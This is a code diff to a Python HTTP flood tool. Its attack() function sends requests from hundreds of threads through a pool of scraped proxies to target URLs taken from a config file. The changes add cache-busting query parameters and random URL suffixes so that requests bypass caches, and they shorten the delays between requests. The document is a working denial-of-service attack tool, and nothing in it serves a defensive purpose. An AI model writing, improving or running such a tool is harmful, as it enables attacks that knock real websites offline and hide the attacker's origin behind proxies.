@@ -18,9 +18,15 @@ g_thread = 10
 
 r = open("config.txt").read()
 js = json.loads(r)
+
 g_lst_target = js['target']
-g_target_host = js['host']
+print g_lst_target
+g_lst_target = filter(lambda x: x.startswith('http'), g_lst_target)
+if 'host' in js:
+    g_target_host = js['host']
 g_thread = js['thread']
+g_bypasscache = js['bypasscache']
+g_append_rnd_val = js['append_rnd_val']
 
 if g_thread > 600:
     g_thread = 600
@@ -44,12 +50,18 @@ def attack():
     proxy = pool.pop()
     while proxy is None:
         proxy = pool.pop()
-        time.sleep(10)
-    time.sleep(5)
+        time.sleep(1)
     while True:
         try:
             put = 1
             target = random.choice(g_lst_target)
+            if g_append_rnd_val == 1:
+                target += str(time.time())
+            if g_bypasscache == 1:
+                if '?' in target:
+                    target += '&t=' + str(time.time())
+                else:
+                    target += '?t=' + str(time.time())
             proxies = {'http': 'http://%s:%s' % (proxy.ip, proxy.port)}
             s = requests.Session()
             headers = {'User-Agent': useragenthelper.get()}
@@ -57,9 +69,9 @@ def attack():
                 if len(g_target_host)>0:
                     headers['Host'] = g_target_host
             r = s.get(target, timeout=2, headers=headers, proxies=proxies)
-            print r.text
+            print r.text[:100]
         except ConnectionError:
-            #put = 0
+            put = 0
             pass
         except:
             print 'Request Failed'
@@ -89,9 +101,9 @@ while True:
     lst = ph.GetFormUrl(FormLiunianip)
     for i in lst:
         pool.add(i)
-    if pool.count > 8000:
-        time.sleep(80)
-    elif pool.count > 2000:
+    if pool.count() > 8000:
+        time.sleep(120)
+    elif pool.count() > 2000:
+        time.sleep(60)
+    elif pool.count() > 1000:
         time.sleep(20)
-    elif pool.count > 1000:
-        time.sleep(10)
